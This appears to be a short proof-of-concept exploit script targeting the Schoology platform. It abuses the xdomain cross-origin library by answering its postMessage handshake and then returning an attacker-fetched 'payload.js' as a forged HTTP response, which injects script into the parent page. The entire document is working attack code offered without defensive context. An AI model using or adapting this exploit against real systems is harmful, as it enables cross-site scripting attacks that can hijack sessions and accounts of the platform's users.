<script>
    // Schoology XSS by attacking vulnerability in xdomain
    function handleAction(id, action, data) {
        switch (action) {
            case "XD_CHECK":
                // This is just to make sure the connection is still alive. Just echo back whatever was sent.
                window.parent.postMessage([id, action, data], "*");
                break;
            case "request":
                fetch("payload.js").then(response => response.text()).then(payload => {
                    // Create fake response with data of the payload
                    const response = {
                        status: 200,
                        text: payload
                    };
                    window.parent.postMessage([id, "response", response], "*");
                });
                break;
            default:
                console.warn("Unknown action", action);
        }
    }
    window.addEventListener("message", event => handleAction.apply(this, event.data))
</script>